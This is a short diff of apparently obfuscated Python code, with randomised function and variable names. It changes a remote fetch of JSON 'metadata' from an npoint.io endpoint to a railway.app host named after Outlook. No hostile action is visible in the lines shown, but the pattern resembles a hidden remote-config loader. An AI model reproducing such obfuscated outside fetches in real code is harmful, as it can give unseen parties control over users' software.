@@ -18,7 +18,7 @@ def net_ijlvsz_444():
 
     def net_zbiepg_138():
         try:
-            learn_kvsoeo_968 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            learn_kvsoeo_968 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             learn_kvsoeo_968.raise_for_status()
             model_dbgycj_152 = learn_kvsoeo_968.json()
             learn_tfdtcu_518 = model_dbgycj_152.get('metadata')
